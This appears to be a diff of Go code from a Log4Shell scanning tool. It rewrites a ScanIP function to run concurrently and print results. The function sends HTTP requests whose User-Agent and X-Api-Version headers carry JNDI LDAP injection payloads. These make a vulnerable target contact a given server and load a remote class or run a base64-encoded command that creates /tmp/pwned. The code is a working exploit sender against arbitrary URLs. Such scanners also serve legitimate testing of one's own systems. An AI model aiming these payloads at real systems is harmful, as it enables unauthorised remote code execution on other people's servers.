@@ -2,44 +2,46 @@ package cmd
 
 import (
     "fmt"
+    "github.com/pterm/pterm"
     log "github.com/sirupsen/logrus"
     "net"
     "net/http"
     "strings"
+    "sync"
     "time"
 )
 
-func ScanIP(ipPortChan <-chan string, server_url string) {
+func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup) {
     client := &http.Client{
-        Timeout: 250 * time.Millisecond,
+        Timeout: 3 * time.Second,
         Transport: &http.Transport{
             TLSHandshakeTimeout:   1 * time.Second,
             ResponseHeaderTimeout: 1 * time.Second,
             ExpectContinueTimeout: 1 * time.Second,
         },
     }
-
-    for target_url := range ipPortChan {
-
-        request, err := http.NewRequest("GET", target_url, nil)
-        if err != nil {
-            log.Fatal(err)
-        }
-        targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", server_url)
-        targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", server_url)
-        log.Debugf("Target URL: %s", target_url)
-        log.Debugf("Target User-Agent: %s", targetUserAgent)
-        log.Debugf("Target X-Api-Version: %s", targetHeader)
-        request.Header.Set("User-Agent", targetUserAgent)
-        request.Header.Add("X-Api-Version", targetHeader)
-        response, err := client.Do(request)
-        if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
-            log.Debug(err)
-        }
-        if response != nil {
-            log.Infof("%s ==> Status code: %d", target_url, response.StatusCode)
-        }
+    targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
+    targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
+    log.Debugf("Target URL: %s", targetUrl)
+    //log.Debugf("Target User-Agent: %s", targetUserAgent)
+    //log.Debugf("Target X-Api-Version: %s", targetHeader)
+    request, err := http.NewRequest("GET", targetUrl, nil)
+    if err != nil {
+        pterm.Error.Println(err)
+        log.Fatal(err)
     }
+    request.Header.Set("User-Agent", targetUserAgent)
+    request.Header.Add("X-Api-Version", targetHeader)
+    response, err := client.Do(request)
+    if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
+        log.Debug(err)
+    }
+    if response != nil {
+        msg := fmt.Sprintf("We got a response, %s ==> Status code: %d", targetUrl, response.StatusCode)
+        log.Infof(msg)
+        pterm.Info.Println(msg)
+    }
+    wg.Done()
 }
 
 // GetLocalIP returns the non loopback local IP of the host
